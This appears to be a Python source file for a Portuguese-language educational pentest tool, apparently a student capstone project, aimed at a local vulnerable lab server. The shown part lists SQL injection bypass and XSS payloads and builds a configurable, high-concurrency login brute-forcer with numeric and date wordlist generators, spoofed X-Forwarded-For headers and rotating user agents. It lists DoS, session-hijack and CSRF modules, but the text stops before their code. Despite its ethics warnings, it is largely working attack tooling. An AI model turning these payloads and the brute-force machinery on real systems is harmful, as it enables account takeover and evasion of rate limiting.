#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
netlab_pentest.py — Ferramenta de Demonstração de Pentest Educacional
═══════════════════════════════════════════════════════════════════════
Explora controladamente todas as vulnerabilidades do servidor de
laboratório do NetLab Educacional (painel_servidor.py).

Vulnerabilidades cobertas
─────────────────────────
  [1]  Força Bruta Assíncrona       — dicionário numérico contra /login
  [2]  Teste de Estresse / DoS       — HTTP flood / TCP / Slowloris / UDP
  [3]  Scanner de Endpoints          — enumera rotas + analisa headers
  [4]  Interceptação HTTP            — mostra dados em texto puro
  [5]  SQL Injection                 — bypass de login + UNION dump de users
  [6]  XSS Exploit                   — refletido (/busca, /perfil) + armazenado (/comentarios)
  [7]  IDOR Exploit                  — acessa pedidos alheios sem autenticação
  [8]  Session Hijack                — enumera tokens previsíveis (token1, token2...)
  [9]  CSRF PoC                      — gera HTML que posta comentário sem consentimento
  [10] Auto-Pwn (Encadeamento)       — SQLi → credenciais → IDOR → XSS armazenado

Dependências
────────────
  pip install aiohttp requests rich

Aviso ético
───────────
  Use exclusivamente contra o servidor NetLab local (localhost / LAN).
  Nunca direcione esta ferramenta a sistemas sem autorização explícita.

Autor  : Yuri Gonçalves Pavão
TCC    : Técnico em Informática — IFFar Campus Uruguaiana
Versão : 5.0  (reescrita completa — sem erros de funcionamento)
"""

from __future__ import annotations

import asyncio
import calendar
import os
import random
import re
import socket
import ssl
import sys
import time
import threading
from abc         import ABC, abstractmethod
from dataclasses import dataclass, field
from typing      import Dict, Iterator, List, Optional, Tuple, Any
import hashlib

# ── Dependências opcionais ────────────────────────────────────────────────────

try:
    import aiohttp
    _AIOHTTP_OK = True
except ImportError:
    _AIOHTTP_OK = False

try:
    import requests as _req
    _REQUESTS_OK = True
except ImportError:
    _REQUESTS_OK = False

try:
    from rich.console  import Console
    from rich.progress import (Progress, SpinnerColumn, BarColumn,
                               TaskProgressColumn, MofNCompleteColumn,
                               TimeElapsedColumn, TimeRemainingColumn)
    from rich.table    import Table
    from rich.panel    import Panel
    from rich.text     import Text
    from rich          import box as rich_box
    _RICH_OK = True
    console  = Console()
except ImportError:
    _RICH_OK = False
    console  = None  # type: ignore[assignment]


# ══════════════════════════════════════════════════════════════════════════════
# Cores ANSI e utilitários de saída
# ══════════════════════════════════════════════════════════════════════════════

_VERDE   = "\033[92m"
_VERM    = "\033[91m"
_AMAR    = "\033[93m"
_CIANO   = "\033[96m"
_MAG     = "\033[95m"
_RESET   = "\033[0m"
_BOLD    = "\033[1m"
_DIM     = "\033[2m"
_AZUL    = "\033[94m"


def _cor_print(cor: str, msg: str) -> None:
    if _RICH_OK and console:
        mapa = {_VERDE: "green", _VERM: "red", _AMAR: "yellow",
                _CIANO: "cyan", _MAG: "magenta", _AZUL: "blue"}
        tag = mapa.get(cor, "white")
        console.print(f"[{tag}]{msg}[/{tag}]")
    else:
        print(f"{cor}{msg}{_RESET}")


# ── Funções de feedback padronizadas ─────────────────────────────────────────
# Hierarquia visual:
#   ok()       — ação concluída com sucesso (verde)
#   erro()     — falha ou bloqueio (vermelho)
#   aviso()    — atenção, risco ou comportamento inesperado (amarelo)
#   info()     — informação complementar neutra (ciano)
#   dica()     — sugestão didática ou corretiva (azul)
#   destaque() — resultado crítico ou alerta de segurança (magenta)
#   fase()     — início de uma etapa de ataque (amarelo negrito)

def ok(msg: str)       -> None: _cor_print(_VERDE, f"  [✓] {msg}")
def erro(msg: str)     -> None: _cor_print(_VERM,  f"  [✗] {msg}")
def aviso(msg: str)    -> None: _cor_print(_AMAR,  f"  [!] {msg}")
def info(msg: str)     -> None: _cor_print(_CIANO, f"  [·] {msg}")
def dica(msg: str)     -> None: _cor_print(_AZUL,  f"  [?] {msg}")
def destaque(msg: str) -> None: _cor_print(_MAG,   msg)


def fase(numero: int, descricao: str) -> None:
    """Exibe o início de uma fase de ataque com numeração clara."""
    separador = "─" * 52
    print(f"\n  {_AMAR}{_BOLD}┌{separador}┐")
    print(f"  │  Fase {numero}: {descricao:<44}│")
    print(f"  └{separador}┘{_RESET}\n")


def limpar_tela() -> None:
    os.system("cls" if os.name == "nt" else "clear")


def entrada(prompt: str, padrao: Optional[str] = None,
            obrigatorio: bool = False,
            dica_extra: str = "") -> str:
    """
    Lê entrada do usuário com:
      - Valor padrão exibido entre colchetes
      - Dica opcional exibida abaixo do prompt
      - Validação de campo obrigatório com mensagem clara
    """
    marca = f" [{_DIM}{padrao}{_RESET}]" if padrao is not None else ""
    if dica_extra:
        print(f"  {_DIM}    → {dica_extra}{_RESET}")
    try:
        valor = input(f"\n  {_CIANO}{prompt}{_RESET}{marca}: ").strip()
    except (EOFError, KeyboardInterrupt):
        return padrao or ""
    if not valor and padrao is not None:
        return padrao
    if obrigatorio and not valor:
        erro("Campo obrigatório — não pode ficar em branco.")
        dica("Digite um valor ou pressione Ctrl+C para cancelar.")
        return entrada(prompt, padrao, obrigatorio, dica_extra)
    return valor


def tabela_rich(linhas: List[List[str]], cabecalho: List[str],
                titulo: str = "") -> None:
    """Exibe tabela formatada — usa Rich quando disponível."""
    if _RICH_OK and console:
        t = Table(title=titulo, box=rich_box.ROUNDED,
                  border_style="cyan", header_style="bold cyan")
        for col in cabecalho:
            t.add_column(col)
        for row in linhas:
            t.add_row(*[str(c) for c in row])
        console.print(t)
    else:
        print(f"\n{_BOLD}{titulo}{_RESET}")
        print("  " + "  |  ".join(cabecalho))
        print("  " + "-" * 60)
        for row in linhas:
            print("  " + "  |  ".join(str(c) for c in row))
        print()


def _linha_separadora(char: str = "─", largura: int = 62) -> str:
    """Retorna uma linha separadora com o caractere especificado."""
    return f"  {char * largura}"


def _cabecalho_modulo(titulo: str, descricao: str, risco: str,
                       cor_risco: str) -> None:
    """
    Exibe o cabeçalho padronizado de cada módulo com:
      - Título, descrição resumida
      - Nível de risco com cor correspondente
    """
    largura = 62
    sep = "═" * largura
    print(f"\n  {_CIANO}{_BOLD}╔{sep}╗")
    print(f"  ║  {titulo:<{largura - 2}}║")
    print(f"  ╠{sep}╣")
    print(f"  ║  {_DIM}{descricao:<{largura - 2}}{_CIANO}║")
    print(f"  ║  {cor_risco}Risco: {risco:<{largura - 9}}{_CIANO}║")
    print(f"  ╚{sep}╝{_RESET}\n")


def _nota_educacional(texto: str) -> None:
    """
    Exibe uma nota didática em destaque ao final de cada módulo.
    Contextualiza o que foi demonstrado e o impacto real.
    """
    print(f"\n  {_AZUL}{_BOLD}┌── NOTA EDUCACIONAL {'─' * 40}┐")
    # Quebra o texto em linhas de até 60 caracteres
    palavras = texto.split()
    linha_atual = ""
    for palavra in palavras:
        if len(linha_atual) + len(palavra) + 1 > 60:
            print(f"  │  {linha_atual}")
            linha_atual = palavra
        else:
            linha_atual = (linha_atual + " " + palavra).strip()
    if linha_atual:
        print(f"  │  {linha_atual}")
    print(f"  └{'─' * 61}┘{_RESET}\n")


def _aviso_etico_modulo(nome_modulo: str) -> None:
    """
    Exibe o aviso ético obrigatório antes de cada módulo.
    Segue a heurística de Nielsen: prevenção de erros (H5).
    """
    print(f"\n  {_AMAR}{'━' * 62}")
    print(f"  ⚠  AVISO ÉTICO — {nome_modulo.upper()}")
    print(f"  {'━' * 62}")
    print(f"  Esta operação deve ser executada EXCLUSIVAMENTE contra")
    print(f"  o servidor NetLab local (localhost / rede de laboratório).")
    print(f"  Uso não autorizado em sistemas de terceiros é crime.")
    print(f"  {'━' * 62}{_RESET}")


def banner() -> None:
    """
    Exibe o banner de boas-vindas com:
      - Identidade visual clara
      - Status das dependências com orientação de instalação
      - Aviso ético proeminente
      - Instrução rápida de uso
    """
    versao = "5.0"
    if _RICH_OK and console:
        # ── Título principal ────────────────────────────────────────────────
        t = Text()
        t.append("  NetLab Pentest ", style="bold cyan")
        t.append(f"v{versao}", style="bold magenta")
        t.append("  —  Demonstração de Segurança Educacional", style="dim cyan")
        console.print(Panel(t, border_style="cyan", padding=(0, 2)))

        # ── Status das dependências ─────────────────────────────────────────
        console.print("\n  [bold]Status das dependências:[/bold]")
        if _AIOHTTP_OK:
            console.print("    [green]✓ aiohttp[/green]   — força bruta assíncrona, scanner, IDOR (instalado)")
        else:
            console.print("    [red]✗ aiohttp[/red]   — necessário para módulos 1, 2, 3, 7  →  pip install aiohttp")

        if _REQUESTS_OK:
            console.print("    [green]✓ requests[/green]  — todos os módulos HTTP (instalado)")
        else:
            console.print("    [red]✗ requests[/red]  — necessário para a maioria dos módulos  →  pip install requests")

        if _RICH_OK:
            console.print("    [green]✓ rich[/green]      — interface visual aprimorada (instalado)")
        else:
            console.print("    [yellow]· rich[/yellow]      — opcional, melhora a visualização  →  pip install rich")

        # ── Informações do alvo padrão ──────────────────────────────────────
        console.print(
            "\n  [dim]Alvo padrão: [bold cyan]http://localhost:8080[/bold cyan] "
            "(servidor NetLab local)[/dim]"
        )

        # ── Aviso ético ─────────────────────────────────────────────────────
        console.print(
            "\n  [bold yellow]⚠  USO ÉTICO OBRIGATÓRIO[/bold yellow]\n"
            "  [dim]Use apenas contra o servidor NetLab local ou redes de laboratório.\n"
            "  Nunca utilize esta ferramenta em sistemas sem autorização explícita.[/dim]\n"
        )

        # ── Instrução de navegação ──────────────────────────────────────────
        console.print(
            "  [dim]Digite o número do módulo e pressione Enter  |  "
            "[bold]0[/bold] para sair[/dim]\n"
        )
    else:
        print(f"""
{_CIANO}{_BOLD}
╔══════════════════════════════════════════════════════════════════╗
║   NetLab Pentest v{versao}  —  Demonstração de Segurança Educacional ║
║   TCC · Técnico em Informática · IFFar Campus Uruguaiana        ║
╚══════════════════════════════════════════════════════════════════╝{_RESET}

{_BOLD}  Status das dependências:{_RESET}
    aiohttp   {'✓ instalado' if _AIOHTTP_OK  else '✗ ausente  →  pip install aiohttp'}
    requests  {'✓ instalado' if _REQUESTS_OK else '✗ ausente  →  pip install requests'}
    rich      {'✓ instalado' if _RICH_OK     else '· opcional →  pip install rich'}

  {_AMAR}{_BOLD}⚠  Use exclusivamente contra o servidor NetLab local.
  {_DIM}   Uso não autorizado é crime. Nunca aponte a sistemas de terceiros.{_RESET}

  {_DIM}Digite o número do módulo e pressione Enter  |  0 para sair{_RESET}
""")


# ══════════════════════════════════════════════════════════════════════════════
# Constantes, wordlists e payloads
# ══════════════════════════════════════════════════════════════════════════════

_MAX_BF_CONCORRENCIA     = 512
_MAX_STRESS_CONCORRENCIA = 1500
_TIMEOUT_PADRAO          = 3.0
_LOTE_STRESS             = 400

# ── Palavras-chave para detectar resultado de login ───────────────────────────
_KW_FALHA = frozenset({
    "incorretos", "incorreto", "inválido", "inválidos",
    "usuario ou senha", "usuário ou senha",
    "senha errada", "invalid", "incorrect", "wrong",
    "failed", "denied", "error", "erro", "unauthorized",
    "forbidden", "bad request", "tente novamente", "fail",
    "negado", "proibido", "not authorized", "não autorizado",
})
_KW_SUCESSO = frozenset({
    "sessão ativa", "sessao ativa", "encerrar sessão", "encerrar sessao",
    "sair", "logout", "dashboard", "bem-vindo", "welcome",
    "iniciada como", "logado", "sessão iniciada", "sucesso", "success",
    "autenticado", "authenticated", "meu perfil", "my profile",
    "logado como", "perfil", "minha conta", "painel", "session active",
})

_LABELS_TABELA_IDOR = frozenset({
    "ação", "id", "quantidade", "preço", "total", "pedido",
    "produto", "usuario", "usuário", "preco", "action",
    "unitário", "unitario",
})

_USER_AGENTS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) "
    "AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1",
)

# Senhas numéricas — o servidor NetLab aceita apenas dígitos no registro
_SENHAS_COMUNS: List[str] = [
    "123456", "654321", "111111", "000000", "123123", "112233",
    "12345678", "87654321", "11223344", "44332211", "10203040", "20304050",
    "12344321", "11111111", "22222222", "33333333", "44444444", "55555555",
    "66666666", "77777777", "88888888", "99999999", "00000000",
    "102030",  "121314",  "147258",  "159357",  "123654",  "321654",
    "456123",  "789456",  "753951",  "147852",  "258369",  "369258",
    "741852",  "852963",  "963741",
    "1234", "4321", "9999", "1111", "0000", "0001", "1000",
    "2000", "2001", "2002", "2003", "2004", "2005", "2006", "2007",
    "2008", "2009", "2010", "2011", "2012", "2013", "2014", "2015",
    "2016", "2017", "2018", "2019", "2020", "2021", "2022", "2023",
    "2024", "2025", "2026",
    "1970", "1980", "1985", "1990", "1995",
    "010203", "030201", "112358", "314159",
    "12344321", "43211234", "192837", "564738", "102938",
    "1234567890", "9876543210", "1234567", "7654321",
]

# Payloads SQLi para bypass de login
_SQLI_BYPASS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "admin' --",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "') OR ('1'='1",
    "' UNION SELECT 1,1,1 --",
]

# Payloads XSS
_XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<iframe src=javascript:alert('XSS')>",
]

# Endpoints para scanner
_ENDPOINTS = [
    "/", "/login", "/register", "/logout",
    "/produtos", "/busca", "/comentarios", "/pedidos",
    "/perfil", "/usuarios", "/api/dados", "/api/usuarios",
    "/admin", "/config", "/backup", "/.env",
    "/robots.txt", "/sitemap.xml",
    "/api", "/api/v1", "/api/users", "/status", "/health",
]


# ══════════════════════════════════════════════════════════════════════════════
# Geradores de wordlist
# ══════════════════════════════════════════════════════════════════════════════

def gerar_intervalo(ini: int, fim: int) -> List[str]:
    return [str(i) for i in range(ini, fim + 1)]


def gerar_por_comprimento(tamanhos: List[int]) -> List[str]:
    """Gera todas as combinações numéricas para os comprimentos dados.
    Usa zfill para manter zeros à esquerda (ex: 4 dígitos → 0000-9999)."""
    resultado = []
    for t in tamanhos:
        resultado.extend(str(i).zfill(t) for i in range(0, 10**t))
    return resultado


def gerar_datas(ano_ini: int, ano_fim: int, fmt: str) -> List[str]:
    formatos: Dict = {
        "DDMMAAAA": lambda d, m, a: f"{d:02d}{m:02d}{a:04d}",
        "DDMMAA":   lambda d, m, a: f"{d:02d}{m:02d}{a % 100:02d}",
        "MMDDAAAA": lambda d, m, a: f"{m:02d}{d:02d}{a:04d}",
        "AAAAMMDD": lambda d, m, a: f"{a:04d}{m:02d}{d:02d}",
        "AAMMDD":   lambda d, m, a: f"{a % 100:02d}{m:02d}{d:02d}",
    }
    fn = formatos.get(fmt)
    if not fn:
        raise ValueError(f"Formato desconhecido: {fmt}")
    resultado = []
    for ano in range(ano_ini, ano_fim + 1):
        for mes in range(1, 13):
            for dia in range(1, calendar.monthrange(ano, mes)[1] + 1):
                resultado.append(fn(dia, mes, ano))
    return resultado


def carregar_wordlist(caminho: str) -> Optional[List[str]]:
    try:
        with open(caminho, "r", encoding="utf-8", errors="ignore") as f:
            palavras = [l.strip() for l in f if l.strip()]
        if not palavras:
            erro("Wordlist vazia — nenhuma senha encontrada no arquivo.")
            dica("Verifique se o arquivo contém uma senha por linha, em texto puro.")
            return None
        ok(f"{len(palavras):,} senhas carregadas de '{caminho}'.")
        return palavras
    except FileNotFoundError:
        erro(f"Arquivo não encontrado: {caminho}")
        dica("Informe o caminho completo ou relativo (ex: wordlists/senhas.txt).")
        return None
    except Exception as e:
        erro(f"Erro ao ler wordlist: {e}")
        dica("Certifique-se de que o arquivo está em formato UTF-8 sem BOM.")
        return None


# ══════════════════════════════════════════════════════════════════════════════
# Helpers de rede e detecção
# ══════════════════════════════════════════════════════════════════════════════

def _ip_falso() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def _ua() -> str:
    return random.choice(_USER_AGENTS)


def _headers_extras() -> dict:
    return {
        "User-Agent":      _ua(),
        "X-Forwarded-For": _ip_falso(),
        "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "pt-BR,pt;q=0.9,en;q=0.8",
    }


def _login_bem_sucedido(
    status: int,
    corpo: str,
    location: str,
    set_cookie: str = "",
) -> bool:
    """
    Detecta login bem-sucedido com sistema de pontuação em camadas.
    Retorna True apenas quando há evidência forte suficiente.
    """
    if status in (301, 302, 303, 307, 308):
        if location and "/login" not in location.lower():
            return True

    if status != 200:
        return False

    corpo_lower = corpo.lower()

    if set_cookie:
        cookie_lower = set_cookie.lower()
        if "sessao=token" in cookie_lower or "session=" in cookie_lower:
            if not any(k in corpo_lower for k in _KW_FALHA):
                return True

    _CAMPO_SENHA_PATTERNS = (
        'type="password"', "type='password'", "type=password",
        'name="senha"',    "name='senha'",
        'name="password"', "name='password'",
        'name="pwd"',      "name='pwd'",
        'password" type=', 'password\' type=',
    )
    if any(p in corpo_lower for p in _CAMPO_SENHA_PATTERNS):
        return False

    if any(k in corpo_lower for k in _KW_FALHA):
        return False

    _KW_SUCESSO_FORTE = frozenset({
        "sessão ativa", "sessao ativa", "sess&atilde;o ativa",
        "encerrar sessão", "encerrar sessao",
        "iniciada como",
        "logado como",
    })
    _KW_SUCESSO_FRACO = frozenset({
        "logout", "dashboard", "meu perfil", "my profile",
        "session active", "autenticado", "authenticated",
        "bem-vindo", "welcome",
    })

    pontuacao = 0
    pontuacao += sum(2 for k in _KW_SUCESSO_FORTE if k in corpo_lower)
    pontuacao += sum(1 for k in _KW_SUCESSO_FRACO if k in corpo_lower)

    return pontuacao >= 2


def _detecta_bloqueio(status: int, corpo: str) -> bool:
    return status == 429 or (
        status in (403, 503)
        and any(w in corpo.lower() for w in ("bloqueado", "blocked", "captcha", "rate"))
    )


def testar_conectividade(url: str) -> bool:
    if not _REQUESTS_OK:
        aviso("requests não instalado — pulando verificação de conectividade.")
        dica("Execute: pip install requests")
        return True
    try:
        r = _req.get(url, timeout=5, allow_redirects=False)
        ok(f"Servidor acessível em {url} — HTTP {r.status_code}")
        return True
    except Exception as e:
        aviso(f"Servidor inacessível ({e})")
        dica(f"Certifique-se de que o servidor NetLab está rodando em {url}.")
        dica("Acesse a aba 'Servidor' no NetLab e clique em 'Iniciar Servidor'.")
        return False


@dataclass
class EvidenciaAtaque:
    """
    Representa uma evidência coletada durante um ataque.
    Separa o que foi observado (evidencia_bruta) de como foi interpretado (conclusao).
    """
    tipo:           str
    endpoint:       str
    payload:        str               = ""
    status_http:    int               = 0
    set_cookie:     str               = ""
    usuario:        str               = ""
    conclusao:      str               = ""
    evidencia_bruta: str              = ""
    confianca:      str               = "ALTA"
    metadados:      Dict[str, Any]    = field(default_factory=dict)

    def __str__(self) -> str:
        return (
            f"[{self.confianca}] {self.tipo} @ {self.endpoint} "
            f"| payload={self.payload[:40]!r} "
            f"| usuário={self.usuario or '—'} "
            f"| conclusão={self.conclusao}"
        )


def _extrair_trecho_evidencia(html: str, indicador: str, contexto: int = 80) -> str:
    """Extrai o trecho do HTML ao redor do indicador encontrado, para rastreabilidade."""
    idx = html.lower().find(indicador.lower())
    if idx == -1:
        return ""
    inicio = max(0, idx - contexto // 2)
    fim    = min(len(html), idx + len(indicador) + contexto // 2)
    return html[inicio:fim].strip()


def _extrair_usuario_do_corpo(corpo: str) -> str:
    """Extrai o nome do usuário autenticado do HTML do NetLab."""
    for pattern in (
        r"[Ss]ess[aã]o ativa[^<]*<strong>([^<]{1,40})</strong>",
        r"[Ss]ess&atilde;o ativa[^<]*<strong>([^<]{1,40})</strong>",
        r"iniciada como[^<]*<strong>([^<]{1,40})</strong>",
        r"logado como[^<]*<strong>([^<]{1,40})</strong>",
        r'nav-session[^>]*>.*?<strong>([^<]{1,40})</strong>',
    ):
        m = re.search(pattern, corpo, re.IGNORECASE | re.DOTALL)
        if m:
            candidato = m.group(1).strip()
            if re.match(r'^[a-zA-Z0-9_.\-]{1,30}$', candidato):
                return candidato
    return ""


# ══════════════════════════════════════════════════════════════════════════════
# Exceção interna para interromper força bruta
# ══════════════════════════════════════════════════════════════════════════════

class _SenhaAchada(Exception):
    def __init__(self, senha: str):
        self.senha = senha


# ══════════════════════════════════════════════════════════════════════════════
# Classe base para módulos de ataque
# ══════════════════════════════════════════════════════════════════════════════

class BaseAtaque(ABC):

    def __init__(self) -> None:
        self._tentativas: int   = 0
        self._erros:      int   = 0
        self._recusados:  int   = 0
        self._inicio:  Optional[float] = None
        self._fim:     Optional[float] = None

    @abstractmethod
    def configurar(self) -> None: ...

    @abstractmethod
    def executar(self) -> None: ...

    @abstractmethod
    def mostrar_resultado(self) -> None: ...

    def executar_interativo(self) -> None:
        self.configurar()
        if not self._confirmar():
            aviso("Operação cancelada pelo usuário.")
            info("Nenhuma requisição foi enviada ao servidor.")
            return
        self._inicio = time.monotonic()
        try:
            self.executar()
        except KeyboardInterrupt:
            aviso("\n  Execução interrompida pelo usuário (Ctrl+C).")
            info("Resultados parciais serão exibidos a seguir.")
        self._fim = time.monotonic()
        self.mostrar_resultado()

    def _confirmar(self) -> bool:
        """
        Solicita confirmação explícita antes de iniciar qualquer ataque.
        Reforça a heurística de controle e liberdade do usuário (Nielsen H3).
        """
        print(f"\n  {_AMAR}{'─' * 62}")
        print(f"  Confirme antes de iniciar:")
        print(f"    • Revise os parâmetros acima antes de continuar.")
        print(f"    • A operação será enviada ao servidor configurado.")
        print(f"    • Pressione Ctrl+C a qualquer momento para interromper.")
        print(f"  {'─' * 62}{_RESET}")
        resposta = entrada("Iniciar a operação? (s/N)", "n")
        return resposta.lower().startswith("s")

    @property
    def _decorrido(self) -> float:
        i = self._inicio or time.monotonic()
        f = self._fim    or time.monotonic()
        return max(f - i, 1e-9)


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 1 — Força Bruta Assíncrona
# ══════════════════════════════════════════════════════════════════════════════

class ModuloBruteForce(BaseAtaque):
    """Força bruta assíncrona (aiohttp) ou síncrona (requests) contra /login."""

    def __init__(self) -> None:
        super().__init__()
        self._url_login:    str           = ""
        self._usuario:      str           = "admin"
        self._senhas:       List[str]     = []
        self._concorrencia: int           = 80
        self._delay:        float         = 0.0
        self._timeout:      float         = 3.0
        self._proxy:        Optional[str] = None
        self._resultado:    Optional[str] = None
        self._bypass_sqli:  Optional[str] = None
        self._waf:          bool          = False

    def configurar(self) -> None:
        _aviso_etico_modulo("Força Bruta Assíncrona")
        _cabecalho_modulo(
            titulo="Módulo 1 — Força Bruta Assíncrona",
            descricao="Testa senhas automaticamente contra /login sem limite de tentativas.",
            risco="ALTO — demonstra ausência de bloqueio por tentativas",
            cor_risco=_VERM,
        )

        # ── URL do servidor ───────────────────────────────────────────────────
        url_base = entrada(
            "URL base do servidor",
            "http://localhost:8080",
            dica_extra="Endereço completo. Ex: http://192.168.1.10:8080",
        )
        if not url_base.startswith("http"):
            url_base = "http://" + url_base
        url_base = url_base.rstrip("/")
        self._url_login = url_base + "/login"
        testar_conectividade(url_base)

        # ── Usuário alvo ───────────────────────────────────────────────────────
        self._usuario = entrada(
            "Usuário alvo",
            "admin",
            obrigatorio=True,
            dica_extra="Conta do servidor NetLab. Usuários padrão: admin, alice, bob, carlos.",
        )
        ok(f"Alvo configurado: usuário '{self._usuario}' em {self._url_login}")

        # ── Wordlist ───────────────────────────────────────────────────────────
        self._senhas = self._menu_wordlist()

        # ── Bypass SQLi opcional ───────────────────────────────────────────────
        usar_sqli = entrada(
            "Incluir payloads de bypass SQLi antes do dicionário? (s/N)",
            "n",
            dica_extra="Se 's', adiciona tentativas de injeção SQL ao início da lista.",
        )
        if usar_sqli.lower().startswith("s"):
            sqli_extras = [
                "' OR '1'='1", "' OR 1=1 --", "admin' --",
                "' OR '1'='1' --", "') OR ('1'='1",
            ]
            self._senhas = sqli_extras + self._senhas
            ok(f"{len(sqli_extras)} payloads SQLi adicionados ao início da lista.")

        # ── Parâmetros avançados ───────────────────────────────────────────────
        self._concorrencia = max(1, min(
            int(entrada(
                f"Coroutines simultâneas (1 a {_MAX_BF_CONCORRENCIA})",
                "80",
                dica_extra="Número de tentativas paralelas. Valores altos podem derrubar o servidor.",
            )),
            _MAX_BF_CONCORRENCIA,
        ))
        self._delay   = float(entrada(
            "Atraso entre requisições em segundos",
            "0.0",
            dica_extra="Use 0.0 para máxima velocidade. Use 0.5 para demonstração mais lenta.",
        ))
        self._timeout = max(0.1, float(entrada(
            "Timeout por requisição em segundos",
            "2.5",
            dica_extra="Tempo máximo de espera por resposta. Valores baixos aumentam a velocidade.",
        )))
        proxy = entrada(
            "Proxy HTTP opcional (deixe vazio para sem proxy)",
            "",
            dica_extra="Ex: http://127.0.0.1:8888  (útil para interceptar com Burp Suite)",
        )
        self._proxy = proxy if proxy else None

        # ── Resumo da configuração ─────────────────────────────────────────────
        tabela_rich([
            ["Endpoint alvo",   self._url_login],
            ["Usuário",         self._usuario],
            ["Total de senhas", f"{len(self._senhas):,}"],
            ["Paralelo",        f"{self._concorrencia} coroutines"],
            ["Atraso",          f"{self._delay}s por requisição"],
            ["Timeout",         f"{self._timeout}s por requisição"],
            ["Proxy",           self._proxy or "Nenhum"],
            ["Motor HTTP",      "asyncio + aiohttp (assíncrono)" if _AIOHTTP_OK else "requests (síncrono — mais lento)"],
        ], ["Parâmetro", "Valor Configurado"], "Resumo da Configuração — Força Bruta")

    def _menu_wordlist(self) -> List[str]:
        """
        Menu de seleção da estratégia de senhas com descrição clara de cada opção.
        Aplica heurística de reconhecimento em vez de memorização (Nielsen H6).
        """
        print(f"\n  {_CIANO}{_BOLD}Estratégia de senha:{_RESET}")
        print(f"  {_DIM}O servidor NetLab aceita apenas senhas numéricas.{_RESET}")
        print()

        opcoes = [
            ("1", "Senhas numéricas comuns",
             f"{len(_SENHAS_COMUNS)} entradas pré-definidas  (mais rápido, cobre casos óbvios)"),
            ("2", "Intervalo numérico",
             "Ex: 0 a 9999 = 10.000 senhas  (útil para datas e pins curtos)"),
            ("3", "Por comprimento de dígitos",
             "Ex: 4 dígitos = 0000 a 9999 = 10.000 senhas  (força bruta por tamanho)"),
            ("4", "Wordlist de arquivo externo",
             "Carrega um arquivo .txt com uma senha por linha"),
            ("5", "Datas formatadas",
             "Ex: aniversários de 1980 a 2010 (DDMMAAAA, AAAAMMDD, etc.)"),
            ("6", "Força bruta total por dígitos",
             "Testa TODAS as combinações de N dígitos  (pode ser lento para N > 5)"),
        ]

        for num, nome, descricao in opcoes:
            print(f"    {_BOLD}{num}{_RESET}  {_CIANO}{nome}{_RESET}")
            print(f"         {_DIM}{descricao}{_RESET}")
            print()

        opcao = entrada("Escolha a estratégia [1 a 6]", "1")

        if opcao == "1":
            aviso(f"{len(_SENHAS_COMUNS)} senhas numéricas comuns selecionadas.")
            return list(_SENHAS_COMUNS)

        if opcao == "2":
            ini = int(entrada("Valor inicial do intervalo", "0", dica_extra="Ex: 0"))
            fim = int(entrada("Valor final do intervalo", "9999", dica_extra="Ex: 9999"))
            lista = gerar_intervalo(ini, fim)
            aviso(f"{len(lista):,} senhas geradas no intervalo {ini} a {fim}.")
            return lista

        if opcao == "3":
            raw = entrada(
                "Comprimentos desejados",
                "4",
                dica_extra="Ex: 4 (somente 4 dígitos)  |  4,6 (4 e 6)  |  4-6 (4, 5 e 6)",
            )
            if "-" in raw:
                a, b = map(int, raw.split("-", 1))
                tamanhos = list(range(a, b + 1))
            elif "," in raw:
                tamanhos = [int(x.strip()) for x in raw.split(",")]
            else:
                tamanhos = [int(raw.strip())]
            total = sum(10**t for t in tamanhos)
            aviso(f"{total:,} senhas a testar (inclui zeros à esquerda).")
            if total > 100_000:
                aviso(f"Lista grande: {total:,} senhas podem demorar alguns minutos.")
            confirmar = entrada(f"Confirmar {total:,} senhas? (s/N)", "n")
            if not confirmar.lower().startswith("s"):
                return self._menu_wordlist()
            return gerar_por_comprimento(tamanhos)

        if opcao == "4":
            caminho = entrada(
                "Caminho do arquivo wordlist",
                obrigatorio=True,
                dica_extra="Ex: wordlists/senhas.txt  (uma senha por linha)",
            )
            palavras = carregar_wordlist(caminho)
            if not palavras:
                return self._menu_wordlist()
            return palavras

        if opcao == "5":
            ano_ini = int(entrada("Ano inicial para gerar datas", "1980"))
            ano_fim = int(entrada("Ano final para gerar datas", "2010"))
            print(f"\n  {_DIM}Formatos disponíveis:{_RESET}")
            print(f"    DDMMAAAA  → 31121990 (dia/mês/ano completo)")
            print(f"    DDMMAA    → 311290  (dia/mês/ano curto)")
            print(f"    MMDDAAAA  → 12311990 (formato americano)")
            print(f"    AAAAMMDD  → 19901231 (formato ISO)")
            print(f"    AAMMDD    → 901231  (ano curto + mês + dia)")
            fmt = entrada("Formato das datas", "DDMMAAAA").upper()
            datas = gerar_datas(ano_ini, ano_fim, fmt)
            aviso(f"{len(datas):,} datas geradas no formato {fmt}.")
            return datas

        if opcao == "6":
            digitos = int(entrada(
                "Quantidade de dígitos",
                "4",
                dica_extra="4 = 0000 a 9999 (10.000 senhas)  |  6 = 1.000.000 senhas",
            ))
            total = 10 ** digitos
            aviso(f"Força bruta total: {total:,} senhas de {digitos} dígito(s).")
            if total > 1_000_000:
                aviso("Atenção: lista muito grande. Isso pode levar muito tempo.")
            confirmar = entrada(f"Confirmar {total:,} senhas? (s/N)", "n")
            if not confirmar.lower().startswith("s"):
                return self._menu_wordlist()
            return gerar_por_comprimento([digitos])

        aviso("Opção não reconhecida — usando senhas comuns como padrão.")
        return list(_SENHAS_COMUNS)

    # ── Execução ──────────────────────────────────────────────────────────────

    def executar(self) -> None:
        if _AIOHTTP_OK:
            asyncio.run(self._async_main())
